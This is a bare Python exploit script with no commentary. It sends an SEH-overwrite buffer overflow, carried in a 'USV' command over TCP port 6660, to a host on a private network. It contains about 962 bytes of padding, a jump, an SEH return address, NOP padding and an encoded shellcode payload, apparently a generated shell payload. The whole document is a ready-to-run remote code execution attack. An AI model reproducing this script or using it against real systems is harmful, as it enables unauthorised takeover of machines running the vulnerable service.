#!/usr/bin/python

import socket

payload =  b""
payload += b"\xda\xcb\xba\x8d\xb9\x85\x79\xd9\x74\x24\xf4\x5e"
payload += b"\x31\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x63"
payload += b"\x45\x67\x8c\x87\x5e\xea\x6f\x77\x9f\x8b\xe6\x92"
payload += b"\xae\x8b\x9d\xd7\x81\x3b\xd5\xb5\x2d\xb7\xbb\x2d"
payload += b"\xa5\xb5\x13\x42\x0e\x73\x42\x6d\x8f\x28\xb6\xec"
payload += b"\x13\x33\xeb\xce\x2a\xfc\xfe\x0f\x6a\xe1\xf3\x5d"
payload += b"\x23\x6d\xa1\x71\x40\x3b\x7a\xfa\x1a\xad\xfa\x1f"
payload += b"\xea\xcc\x2b\x8e\x60\x97\xeb\x31\xa4\xa3\xa5\x29"
payload += b"\xa9\x8e\x7c\xc2\x19\x64\x7f\x02\x50\x85\x2c\x6b"
payload += b"\x5c\x74\x2c\xac\x5b\x67\x5b\xc4\x9f\x1a\x5c\x13"
payload += b"\xdd\xc0\xe9\x87\x45\x82\x4a\x63\x77\x47\x0c\xe0"
payload += b"\x7b\x2c\x5a\xae\x9f\xb3\x8f\xc5\xa4\x38\x2e\x09"
payload += b"\x2d\x7a\x15\x8d\x75\xd8\x34\x94\xd3\x8f\x49\xc6"
payload += b"\xbb\x70\xec\x8d\x56\x64\x9d\xcc\x3e\x49\xac\xee"
payload += b"\xbe\xc5\xa7\x9d\x8c\x4a\x1c\x09\xbd\x03\xba\xce"
payload += b"\xc2\x39\x7a\x40\x3d\xc2\x7b\x49\xfa\x96\x2b\xe1"
payload += b"\x2b\x97\xa7\xf1\xd4\x42\x67\xa1\x7a\x3d\xc8\x11"
payload += b"\x3b\xed\xa0\x7b\xb4\xd2\xd1\x84\x1e\x7b\x7b\x7f"
payload += b"\xc9\x44\xd4\xb6\x2c\x2d\x27\x48\x2b\x7f\xae\xae"
payload += b"\x59\x6f\xe7\x79\xf6\x16\xa2\xf1\x67\xd6\x78\x7c"
payload += b"\xa7\x5c\x8f\x81\x66\x95\xfa\x91\x1f\x55\xb1\xcb"
payload += b"\xb6\x6a\x6f\x63\x54\xf8\xf4\x73\x13\xe1\xa2\x24"
payload += b"\x74\xd7\xba\xa0\x68\x4e\x15\xd6\x70\x16\x5e\x52"
payload += b"\xaf\xeb\x61\x5b\x22\x57\x46\x4b\xfa\x58\xc2\x3f"
payload += b"\x52\x0f\x9c\xe9\x14\xf9\x6e\x43\xcf\x56\x39\x03"
payload += b"\x96\x94\xfa\x55\x97\xf0\x8c\xb9\x26\xad\xc8\xc6"
payload += b"\x87\x39\xdd\xbf\xf5\xd9\x22\x6a\xbe\xfa\xc0\xbe"
payload += b"\xcb\x92\x5c\x2b\x76\xff\x5e\x86\xb5\x06\xdd\x22"
payload += b"\x46\xfd\xfd\x47\x43\xb9\xb9\xb4\x39\xd2\x2f\xba"
payload += b"\xee\xd3\x65"

buffer = "A" * 962 + "\xeb\x06\x90\x90" # Offset + JMP + NOPS
buffer += "\x6a\x8c\x9c\x0f" # SEH 0x0f9c8c6a
buffer += "\x90" * 16
buffer += payload
buffer += "D" * (2500-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.201.45', 6660))
s.send('USV ' + buffer + "\r\n\r\n")
